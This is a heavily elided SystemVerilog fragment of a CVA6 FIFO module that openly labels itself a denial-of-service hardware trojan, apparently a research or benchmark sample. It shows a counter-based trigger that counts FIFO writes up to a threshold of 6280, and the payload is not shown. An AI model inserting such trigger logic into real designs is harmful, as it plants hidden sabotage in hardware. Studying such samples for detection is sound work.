...
module cva6_fifo_v3_trojan_DoS #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6280)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6280;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (fifo_ram_we) trojan_counter <= trojan_counter + 1;
